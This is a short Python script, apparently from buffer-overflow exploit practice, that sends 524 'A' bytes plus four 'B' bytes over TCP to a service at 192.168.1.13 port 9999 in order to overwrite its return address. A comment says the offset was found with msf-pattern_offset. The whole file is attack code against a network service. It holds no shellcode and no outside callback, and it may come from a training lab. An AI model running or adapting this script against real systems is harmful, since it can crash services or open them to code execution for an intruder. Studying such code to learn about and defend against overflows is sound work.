#!/usr/bin/python3
#the offset was found using msf-pattern_offset -l 1000 -q 65724134. The offset was found to be 524 bytes
import sys, socket

buffer = "A" * 524 + "B" * 4  

print("sending payload...")
payload = buffer + '\r\n'               
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.13',9999))
s.send((payload.encode()))
s.close()
